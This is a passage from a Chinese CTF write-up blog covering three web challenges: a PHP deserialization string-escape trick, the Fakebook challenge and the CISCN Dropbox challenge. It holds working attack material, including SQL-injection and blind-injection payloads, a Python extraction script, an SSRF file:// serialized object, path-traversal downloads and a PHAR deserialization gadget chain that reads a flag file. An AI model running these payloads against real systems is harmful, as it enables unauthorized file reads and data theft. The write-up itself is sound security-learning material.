+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>逃逸了一个字符。<br>我们需要逃逸<code>&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>34个字符。所以需要34个where。这里是通过pop链来实现字符逃逸。先想要进行字符逃逸，字符被替换成hacker六个字符，只有where是五个字符可以帮我们逃逸一个字符。<br>我们还需要知道当反序列化到足够的长度时，后面的数据会被扔掉<br>测试：</p>
+<pre class="line-numbers language-html"><code class="language-html">&lt;?php
+var_dump(unserialize('a:4:{s:5:"phone";s:11:"17758584216";s:5:"email";s:17:"1669390868@qq.com";s:8:"nickname";s:3:"111";s:5:"photo";s:10:"config.php";}s:5:"photo";s:10:"config.php";}'));
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>得到：</p>
+<pre class="line-numbers language-html"><code class="language-html">array(4) { ["phone"]=> string(11) "17758584216" ["email"]=> string(17) "1669390868@qq.com" ["nickname"]=> string(3) "111" ["photo"]=> string(10) "config.php" } 
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>本地测试一波payload：</p>
+<pre class="line-numbers language-html"><code class="language-html">&lt;?php
+$profile['phone'] ='17758584216';
+$profile['email'] = '123@qq.com';
+$profile['nickname'][] ='wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}';
+$profile['photo'] = '1111111';
+echo serialize($profile);
+$string=serialize($profile);
+$safe = array('select', 'insert', 'update', 'delete', 'where');
+$safe = '/' . implode('|', $safe) . '/i';
+$S=preg_replace($safe, 'hacker', $string);
+echo "<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>";
+echo "<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>";
+echo "<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>";
+var_dump(unserialize($S));
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>得到：</p>
+<pre class="line-numbers language-html"><code class="language-html">a:4:{s:5:"phone";s:11:"17758584216";s:5:"email";s:10:"123@qq.com";s:8:"nickname";a:1:{i:0;s:204:"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}";}s:5:"photo";s:7:"1111111";}
+
+
+array(4) { ["phone"]=> string(11) "17758584216" ["email"]=> string(10) "123@qq.com" ["nickname"]=> array(1) { [0]=> string(204) "hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker" } ["photo"]=> string(10) "config.php" } 
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>成功。所以payload：<code>nickname[]</code>传入</p>
+<pre class="line-numbers language-html"><code class="language-html">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>成功把config.php读出来。进行base64解码即可得到flag。</p>
+<h2 id="Fakebook"><a href="#Fakebook" class="headerlink" title="Fakebook"></a>Fakebook</h2><p><strong>知识点：sql注入，SSRF，反序列化</strong><br>进入这个题目，注册登陆，发现是添加网址，并展示页面，猜测存在ssrf。。<br>进入展示地址页面，发现并没有展示出来。<br><img src="https://s2.ax1x.com/2019/09/27/uMEzFS.png" alt="uMEzFS.png"><br>发现get传入参数no,像是id,猜测存在注入。。。<br>随手试试1 and 0成功。。。<br>开始fuzz，测试发现过滤了</p>
+<pre class="line-numbers language-html"><code class="language-html">hex
+0x
+union select 但是union/**/select可以绕过
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>发现存在报错注入：<br>开搞</p>
+<pre class="line-numbers language-html"><code class="language-html">1 and updatexml(1,concat('~',substr((select group_concat(schema_name) from information_schema.schemata),1,32),'~'),1) # 注库名 得到fakebook,information_schema,mysql,performance_schema,test
+
+1 and updatexml(1,concat('~',substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,32),'~'),1) #注表 users
+
+1 and updatexml(1,concat('~',substr((Select group_concat(column_name) from information_schema.columns where table_name='users'),1,32),'~'),1) #注列  no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>emmm，没有flag？？？<br>说明思路可能有点问题。。。<br>最后扫一下目录，发现存在robots.txt,user.php,db.php,和flag.php(扫目录的重要性)，提示</p>
+<pre class="line-numbers language-html"><code class="language-html">User-agent: *
+Disallow: /user.php.bak
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>存在源码。。。这就舒服了。<br>对了我们知道了文件地址，尝试load_file()读一下？<br>成了！！！</p>
+<pre class="line-numbers language-html"><code class="language-html">http://89c25947-8872-4ae9-b0f1-c18a190e9a78.node2.buuoj.cn.wetolink.com:82/view.php?no=0%20union/**/select+1,load_file(%27/var/www/html/flag.php%27),1,1
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://s2.ax1x.com/2019/09/27/uMnx2D.png" alt="uMnx2D.png"><br>同样可以盲注exp：</p>
+<pre class="line-numbers language-html"><code class="language-html">import requests
+
+url = 'http://89c25947-8872-4ae9-b0f1-c18a190e9a78.node2.buuoj.cn.wetolink.com:82/view.php?no='
+result = ''
+
+for x in range(0, 100):
+    high = 127
+    low = 32
+    mid = (low + high) // 2
+    while high > low:
+        payload = "if(ascii(substr((load_file('/var/www/html/flag.php')),%d,1))>%d,1,0)" % (x, mid)
+        response = requests.get(url+payload)
+        if 'https://ab-alex.xyz' in response.text:
+            low = mid + 1
+        else:
+            high = mid
+        mid = (low + high) // 2
+
+    result += chr(int(mid))
+    print(result)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>他给的源码什么意思？？？（一脸懵逼。。。）<br>研究源码：user.php.bak</p>
+<pre class="line-numbers language-html"><code class="language-html">&lt;?php
+class UserInfo
+{
+    public $name = "";
+    public $age = 0;
+    public $blog = "";
+
+    public function __construct($name, $age, $blog)
+    {
+        $this->name = $name;
+        $this->age = (int)$age;
+        $this->blog = $blog;
+    }
+
+    function get($url)
+    {
+        $ch = curl_init();//初始化一个curl会话
+
+        curl_setopt($ch, CURLOPT_URL, $url);//设置需要抓取的URL
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);//设置cURL 参数，要求结果保存到字符串中如果成功只将结果返回，不自动输出任何内容。
+        $output = curl_exec($ch); //运行cURL，请求网页
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); //获取http状态码
+        if($httpCode == 404) {
+            return 404;
+        }
+        curl_close($ch);//关闭一个curl会话
+
+        return $output;
+    }
+
+    public function getBlogContents ()
+    {
+        return $this->get($this->blog);
+    }
+
+    public function isValidBlog ()
+    {
+        $blog = $this->blog;
+        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
+    }
+
+}
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>仔细读源码，我们可以通过ssrf来读取文件，我们可以让url等于<code>file://</code>来读文件，让服务器读取文件然后再返回，构造exp:</p>
+<pre class="line-numbers language-html"><code class="language-html">&lt;?php
+class UserInfo
+{
+    public $name = "alex";
+    public $age = 1;
+    public $blog = "file:///var/www/html/flag.php";
+}
+$a=new  UserInfo;
+echo serialize($a);
+//O:8:"UserInfo":3:{s:4:"name";s:4:"alex";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>payload：</p>
+<pre class="line-numbers language-html"><code class="language-html">http://89c25947-8872-4ae9-b0f1-c18a190e9a78.node2.buuoj.cn.wetolink.com:82/view.php?no=0 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:4:"alex";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>成功读取flag。最后发现load_file是非预期解emmm。</p>
+<h2 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h2><p><strong>知识点：任意文件下载,PHAR反序列化RCE</strong></p>
+<p>进入题目，发现是个登陆框，有注册，注册账号然后登陆，发现能够进行上传文件，测试上传，上传对文件名没有做限制（前端限制，忽略），尝试上传php文件。能够上传，但是文件后缀被改成png,文件名没有变化。发现存在下载和删除功能。。。（测试我常见的漏洞，均未果）<br>正确思路，发现存在下载功能，那我们可以尝试下载源码啊。尝试<br>filename=../../index.php成功下载到源代码。开始下载所有源码：class.php,delete.php,download.php,login.php,register.php<br>开始审计源码:</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token prolog">&lt;?php 
+if (strlen($filename) &lt; 40 &amp;&amp; $file->open($filename) &amp;&amp; stristr($filename, "flag") === false) { #省略一些代码 
+    echo $file->close(); 
+} else { 
+    echo "File not exist"; } 
+?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这里禁止了对flag的下载。。所以想要获取flag,需要另寻他法。。。</p>
+<p>这里用到了phar序列化。具体参考另一篇文章phar拓展反序列化攻击面。</p>
+<p>这里来梳理一下这个题的逻辑，首先，看这三个类，具体代码：</p>
+<pre class="line-numbers language-html"><code class="language-html">class User {
+    public $db;
+    public function __construct() {
+        global $db;
+        $this->db = $db;
+    }
+    public function user_exist($username) {
+        $stmt = $this->db->prepare("SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;");
+        $stmt->bind_param("s", $username);
+        $stmt->execute();
+        $stmt->store_result();
+        $count = $stmt->num_rows;
+        if ($count === 0) {
+            return false;
+        }
+        return true;
+    }
+    public function add_user($username, $password) {
+        if ($this->user_exist($username)) {
+            return false;
+        }
+        $password = sha1($password . "SiAchGHmFx");
+        $stmt = $this->db->prepare("INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);");
+        $stmt->bind_param("ss", $username, $password);
+        $stmt->execute();
+        return true;
+    }
+    public function verify_user($username, $password) {
+        if (!$this->user_exist($username)) {
+            return false;
+        }
+        $password = sha1($password . "SiAchGHmFx");
+        $stmt = $this->db->prepare("SELECT `password` FROM `users` WHERE `username` = ?;");
+        $stmt->bind_param("s", $username);
+        $stmt->execute();
+        $stmt->bind_result($expect);
+        $stmt->fetch();
+        if (isset($expect) &amp;&amp; $expect === $password) {
+            return true;
+        }
+        return false;
+    }
+    public function __destruct() {
+        $this->db->close();
+    }
+}
+class FileList {
+    private $files;
+    private $results;
+    private $funcs;
+    public function __construct($path) {
+        $this->files = array();
+        $this->results = array();
+        $this->funcs = array();
+        $filenames = scandir($path);
+        $key = array_search(".", $filenames);
+        unset($filenames[$key]);
+        $key = array_search("..", $filenames);
+        unset($filenames[$key]);
+        foreach ($filenames as $filename) {
+            $file = new File();
+            $file->open($path . $filename);
+            array_push($this->files, $file);
+            $this->results[$file->name()] = array();
+        }
+    }
+    public function __call($func, $args) {
+        array_push($this->funcs, $func);
+        foreach ($this->files as $file) {
+            $this->results[$file->name()][$func] = $file->$func();
+        }
+    }
+    public function __destruct() {
+        $table = '<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>table-responsive<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>table<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>table table-bordered table-hover sm-font<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>';
+        $table .= '<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>thead</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>';
+        foreach ($this->funcs as $func) {
+            $table .= '<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span> <span class="token attr-name">scope</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text-center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>' . htmlentities($func) . '<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>';
+        }
+        $table .= '<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span> <span class="token attr-name">scope</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text-center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Opt<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>';
+        $table .= '<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>thead</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tbody</span><span class="token punctuation">></span></span>';
+        foreach ($this->results as $filename => $result) {
+            $table .= '<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>';
+            foreach ($result as $func => $value) {
+                $table .= '<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text-center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>' . htmlentities($value) . '<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>';
+            }
+            $table .= '<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text-center<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span> . htmlentities($filename) . <span class="token punctuation">'</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>download<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>下载<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span> / <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>delete<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>删除<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>';
+            $table .= '<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>';
+        }
+        echo $table;
+    }
+}
+class File {
+    public $filename;
+
+    public function open($filename) {
+        $this->filename = $filename;
+        if (file_exists($filename) &amp;&amp; !is_dir($filename)) {
+            return true;
+        } else {
+            return false;
+        }
+    }
+
+    public function name() {
+        return basename($this->filename);
+    }
+
+    public function size() {
+        $size = filesize($this->filename);
+        $units = array(' B', ' KB', ' MB', ' GB', ' TB');
+        for ($i = 0; $size >= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024;
+        return round($size, 2).$units[$i];
+    }
+
+    public function detele() {
+        unlink($this->filename);
+    }
+
+    public function close() {
+        return file_get_contents($this->filename);
+    }
+}
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>先说User类，功能：检查用户是存在，添加用户，验证登录。FileList类，功能：获得用户的上传目录里的文件，并显示在页面上。File类，功能：检测文件是否存在，检测文件大小，删除文件，获取文件内容，获取文件名。</p>
+<p>我们想要读取flag文件，只能通过File类的方法close(),来读取flag文件，审计代码，发现没有其他方法调用close方法，<br>我们所拥有的权限是文件的上传，文件的删除，文件的下载。但是我们发现User类析构函数里面调用了对象的closse方法，析构函数在对象销毁的时候自动执行。然后我们发现FileList类里面存在<code>__call()</code>魔术方法，这个方法是在对象调用不存在的方法时候执行，然后FileList类里面没有close方法。会执行call方法。然后就会调用File对象的close方法。close方法执行后存在results变量里的结果会加入到table变量中被打印出来。</p>
+<p>所以我们要构造自己payload的思路就非常清晰了，想要调用File类的方法close()，就先要调用FileList类里面<code>__call()</code>魔术方法，要想调用<code>__call()</code>魔术方法，就要调用User类的析构函数。所以我们要先定义一个User对象，然后让User对象的db属性指向一个FileList对象。把FileList对象的属性file指向一个File对象，filename指向我们的flag文件。files属性以数组形式指向我们的file对象。在User对象销毁时，执行FileList对象的close方法，因为没有close方法，所以执行call方法，然后会执行File对象的close方法。就可以获取flag了。然后由phar反序列化可知，我们可以得到序列化对象。<br>payload：</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token prolog">&lt;?php
+class User {
+    public $db;
+}
+class File {
+    public $filename;
+}
+class FileList {
+    private $files;
+    private $results;
+    private $funcs;
+    public function __construct() {
+        $file = new File();
+        $file->filename = '/flag.txt';
+        $this->files = array($file);
+        $this->results = array();
+        $this->funcs = array();
+    }
+}
+@unlink("phar.phar");
+$phar = new Phar('phar.phar');
+$phar -> startBuffering();
+$phar -> setStub('GIF89a'.'&lt;?php __HALT_COMPILER();');   //设置stub，增加gif文件头
+$phar ->addFromString('alex.txt','test');  //添加要压缩的文件
+$object = new User();
+$object -> db = new FileList();
+$phar -> setMetadata($object);  //将自定义meta-data存入manifest
+$phar -> stopBuffering();
+
+?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>然后我们获取到phar.phar文件，改后缀为gif。上传成功。然后我们需要找地方打开我们的文件，出发phar机制，来生成序列化对象，发现delete.php，有打开文件。且能够控制文件名，没有队文件名进行限制。</p>
+<pre class="line-numbers language-html"><code class="language-html">if (strlen($filename) &lt; 40 &amp;&amp; $file->open($filename)) 
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>所以，上传之后，我删除文件时，传入文件名为phar://phar.gif/alex.txt,就可以触发phar机制，生成我们构造的User对象。就会执行上面的所述流程。读取flag文件并输出出来。</p>
+<p>参考链接：<br><a href="http://jwt1399.top/2019/08/28/buuctf/" target="_blank" rel="noopener">buuctf部分writeup</a></p>
+	
+	</div>
+	
+	<div id="current-post-cover" data-scr="/images/post-cover/31.jpg"></div>
+
+	<!-- relate post, comment...-->
+	<div class="investment-container">
+		<div class="investment-header">
+			<div class="investment-title-1">
+				<div class="on">相关文章</div>
+				<div>评论</div>
+			</div>
+			<div class="investment-title-2">	            
+				
+	<span>
+		<a href="javascript: window.scrollTo(0, 0);">返回顶部</a>
+		
+			<a href="/2019/10/09/基本工具使用/" title="基本工具使用" rel="prev">
+				&laquo;上一篇
+			</a>
+		
+		
+			<a href="/2019/09/04/OGeek-CTF-2019-Enjoy-You-Self/" title="OGeek CTF 2019-Enjoy You Self" rel="next">
+				下一篇&raquo;
+			</a>
+			
+	</span>
+      		
+			</div>	
+		</div>
+		
+		<div class="investment-content">
+			<div class="investment-content-list">
+				
+
+<div class="relate-post">
+	<ul>
+		
+				<li>
+					<div>
+						<a href="/2019/11/20/2019极客大挑战RCE-ME/" title="2019极客大挑战RCE ME">
+							2019极客大挑战RCE ME
+						</a>
+						<p>
+							题目环境：http://114.116.44.23:40001/
+题目还是老样子。无字母数字rce。知识点其实都有写过，就不说了。详细参见：【RCE提高篇】题目源码：
+&lt;?php
+ini_set("display_errors"...
+						</p>
+					</div>
+
+					<a href="/2019/11/20/2019极客大挑战RCE-ME/" title="2019极客大挑战RCE ME">				
+						<img src="/images/post-cover/32.jpg" class="relateImg" alt="2019极客大挑战RCE ME">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/10/16/buuctf刷题记录-序/" title="buuctf刷题记录(序)">
+							buuctf刷题记录(序)
+						</a>
+						<p>
+							love math知识点：代码审计，绕waf直接给出源码：
+&lt;?php
+error_reporting(0);
+//听说你很喜欢数学，不知道你是否爱它胜过爱flag
+if(!isset($_GET['c'])){
+    sho...
+						</p>
+					</div>
+
+					<a href="/2019/10/16/buuctf刷题记录-序/" title="buuctf刷题记录(序)">				
+						<img src="/images/post-cover/33.jpg" class="relateImg" alt="buuctf刷题记录(序)">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/09/04/OGeek-CTF-2019-Enjoy-You-Self/" title="OGeek CTF 2019-Enjoy You Self">
+							OGeek CTF 2019-Enjoy You Self
+						</a>
+						<p>
+							前言最近ctf不少，但是成绩不咋样，菜的真实。新学期开始了，最后一年了。。。继续努力吧。OPPO OGeek CTF 2019咋说呢，菜。。。总结一下学到的东西吧。
+Enjoy You Self线上环境：http://47.107.2...
+						</p>
+					</div>
+
+					<a href="/2019/09/04/OGeek-CTF-2019-Enjoy-You-Self/" title="OGeek CTF 2019-Enjoy You Self">				
+						<img src="/images/post-cover/30.jpg" class="relateImg" alt="OGeek CTF 2019-Enjoy You Self">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/08/06/2018n1ctf-esay-php复现/" title="2018n1ctf-esay-php复现">
+							2018n1ctf-esay-php复现
+						</a>
+						<p>
+							前言最近做题，两次遇见这个题。第一次看着writeup都没复现成功。emm（菜的真实。。。）。这次自己搭的环境用三种方法来复现这个题。
+环境搭建官方给了环境，有dockerfile。所以比较容易搭建的。官方文件在docker上安装上d...
+						</p>
+					</div>
+
+					<a href="/2019/08/06/2018n1ctf-esay-php复现/" title="2018n1ctf-esay-php复现">				
+						<img src="/images/post-cover/29.jpg" class="relateImg" alt="2018n1ctf-esay-php复现">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/06/16/刷题记录/" title="刷题记录">
+							刷题记录
+						</a>
+						<p>
+							一步步慢慢绕题目：
+&lt;?php
+show_source(__FILE__);
+$v1=0;$v2=0;$v3=0;
+$a=(array)json_decode(@$_GET['foo']);
+if(is_array($a)){
+...
+						</p>
+					</div>
+
+					<a href="/2019/06/16/刷题记录/" title="刷题记录">				
+						<img src="/images/post-cover/38.jpg" class="relateImg" alt="刷题记录">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/06/13/sql注入新姿势-2019强网杯/" title="sql注入新姿势-2019强网杯">
+							sql注入新姿势-2019强网杯
+						</a>
+						<p>
+							前言woc前一段时间，写过一次，发现被我搞丢了，气死…重写ing
+随便注首先，对题目进行测试尝试一下1&#39;发现会得到报错，尝试一下万能密码1&#39; or &#39;1&#39;=&#39;1，发现能够把当前表所有的值全部输出...
+						</p>
+					</div>
+
+					<a href="/2019/06/13/sql注入新姿势-2019强网杯/" title="sql注入新姿势-2019强网杯">				
+						<img src="/images/post-cover/30.jpg" class="relateImg" alt="sql注入新姿势-2019强网杯">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/06/05/ciscn线下部分题解/" title="ciscn线下部分题解">
+							ciscn线下部分题解
+						</a>
+						<p>
+							前言ciscn华中赛区线下赛让我认识到自己是真的菜。。。总结一下这次比赛吧。
+web1 &lt;?php
+// ini_set("display_errors", "On"); 
+// error_reporting(E_ALL | ...
+						</p>
+					</div>
+
+					<a href="/2019/06/05/ciscn线下部分题解/" title="ciscn线下部分题解">				
+						<img src="/images/post-cover/36.jpg" class="relateImg" alt="ciscn线下部分题解">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/04/30/2019ddctfwriteup/" title="2019ddctfwriteup">
+							2019ddctfwriteup
+						</a>
+						<p>
+							web滴~这是i春秋上的一个原题。（原题比这个好）进入页面发现观察jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09像是个base64编码。进行解码。解码两次得到666C61672E6A7067。像是个base1...
+						</p>
+					</div>
+
+					<a href="/2019/04/30/2019ddctfwriteup/" title="2019ddctfwriteup">				
+						<img src="/images/post-cover/25.jpg" class="relateImg" alt="2019ddctfwriteup">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/04/11/2019西湖论剑杯writeup/" title="2019西湖论剑杯writeup">
+							2019西湖论剑杯writeup
+						</a>
+						<p>
+							web部分babyt3首先，访问进去发现有提示：
+开始测试：get方式传参file=index.php发现无限加载。说明可以加载php文件，尝试读取源码。使用php协议php://filter/read=convert.base64-...
+						</p>
+					</div>
+
+					<a href="/2019/04/11/2019西湖论剑杯writeup/" title="2019西湖论剑杯writeup">				
+						<img src="/images/post-cover/22.jpg" class="relateImg" alt="2019西湖论剑杯writeup">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/04/09/2019掘安杯writeup/" title="2019掘安杯writeup">
+							2019掘安杯writeup
+						</a>
+						<p>
+							web部分下载下载与以前见到bugku的题差不多。
+提示：flag.php
+然后下载文件：http://120.79.1.69:10002/?file=flag.php即可得到文件：
+&lt;?php
+header('Content-...
+						</p>
+					</div>
+
+					<a href="/2019/04/09/2019掘安杯writeup/" title="2019掘安杯writeup">				
+						<img src="/images/post-cover/21.jpg" class="relateImg" alt="2019掘安杯writeup">
+					</a>
+				</li>											
+		
+		
+	</ul>
+</div>	
+			</div>
+			<div class="investment-content-list">
+				<div class="layout-comment">
+
+	
+
+		
+
+			<!-- comment gitalk -->
+			<!-- show gitalk comment -->
+<div id="gitalk-container"></div>
+
+<!-- gitalk`s css & js -->
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<link rel="stylesheet" href="/css/comment.css">
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<script type="text/javascript">
+	//Thanks O-R
+	//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
+	//去除尾部匹配正则数组的字符串  
+	//Remove redundant characters
+	String.prototype.trimEnd = function(regStr) {
+		var result = this;
